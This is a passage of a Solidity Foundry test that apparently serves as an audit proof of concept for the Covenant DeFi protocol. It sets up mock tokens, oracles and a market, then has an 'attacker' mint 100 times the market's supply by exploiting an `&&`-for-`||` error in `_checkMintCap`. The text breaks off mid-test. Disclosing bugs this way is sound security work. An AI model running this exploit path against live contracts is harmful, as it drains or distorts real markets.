"MBA\", 18));\n        // FIX: Mint enough tokens to cover both the initial and large mint amounts (1 + 100 = 101 ether).\n        MockERC20(_mockBaseAsset).mint(address(this), 101e18);\n\n        // Deploy mock Quote Asset\n        _mockQuoteAsset = address(new MockERC20(address(this), \"MockQaseAsset\", \"MQA\", 18));\n\n        // Deploy Covenant\n        covenant = new Covenant(address(this));\n\n        // Deploy LEX implementation\n        lex = new LatentSwapLEX(\n            address(this),\n            address(covenant),\n            P_MAX,\n            P_MIN,\n            P_LIM_H,\n            P_LIM_MAX,\n            LN_RATE_BIAS,\n            DURATION,\n            SWAP_FEE\n        );\n\n        // Connect LEX w/ Covenant\n        covenant.setEnabledLEX(address(lex), true);\n\n        // Connect mock oracle w/ Covenant\n        covenant.setEnabledCurator(_mockOracle, true);\n\n        // Create a mock market\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset,\n            quoteToken: _mockQuoteAsset,\n            curator: _mockOracle,\n            lex: address(lex)\n        });\n        _marketId = covenant.createMarket(marketParams, hex\"\");\n\n        // Deploy the Covenant Curator (Oracle Router)\n        covenantCurator = new CovenantCurator(address(this));\n\n        // Deploy a *stub* oracle for the Covenant Curator\n        covenantCuratorOracle = new StubPriceOracle();\n\n        // Link *stub* oracle with mock base and quote assets\n        covenantCurator.govSetConfig(_mockBaseAsset, _mockQuoteAsset, address(covenantCuratorOracle));\n\n        // Deploy mock Chainlink Aggregator\n        chainlinkAggregator = new MockChainlinkAggregator(8);\n\n        // Deploy Chainlink Oracle\n        chainlinkOracle = new ChainlinkOracle(_mockBaseAsset, _mockQuoteAsset, address(chainlinkAggregator), 1 hours);\n\n        // Deploy mock Pyth\n        pyth = new MockPyth();\n\n        // Deploy Pyth Oracle\n        pythOracle = new PythOracle(\n            address(pyth),\n            _mockBaseAsset,\n            _mockQuoteAsset,\n            bytes32(uint256(196)),\n            10 minutes,\n            250\n        );\n    }\n\n    function test_submissionValidity() public {\n        // This PoC demonstrates the logical error in `_checkMintCap` for small markets.\n        // The use of `&&` instead of `||` allows a mint amount that is larger than the\n        // market's total supply, as long as the amount is less than 2**96.\n\n        // 1. Create a small market by minting an initial small amount.\n        // This ensures the market has a non-zero `baseSupply` but is still considered \"small\".\n        uint256 initialMintAmount = 1 ether;\n        MockERC20(_mockBaseAsset).approve(address(covenant), initialMintAmount);\n\n        MintParams memory initialMintParams = MintParams({\n            marketId: _marketId,\n            marketParams: MarketParams({\n            baseToken: _mockBaseAsset,\n            quoteToken: _mockQuoteAsset,\n            curator: _mockOracle,\n            lex: address(lex)\n        }),\n            baseAmountIn: initialMintAmount,\n            to: address(this),\n            minATokenAmountOut: 0,\n            minZTokenAmountOut: 0,\n            data: hex\"\",\n            msgValue: 0\n        });\n        covenant.mint(initialMintParams);\n\n        // Assert that the market now has a base supply of 1 ether.\n        assertEq(covenant.getMarketState(_marketId).baseSupply, initialMintAmount);\n\n        // 2. Attacker prepares to mint an amount far greater than the market's supply.\n        // The intended logic should prevent this, but the flaw allows it.\n        uint256 largeMintAmount = 100 ether; // 100x the current market supply\n        MockERC20(_mockBaseAsset).approve(address(covenant), largeMintAmount);\n\n        MintParams memory largeMintParams = initialMintParams;\n        largeMintParams.baseAmountIn = largeMintAmount;\n\n        //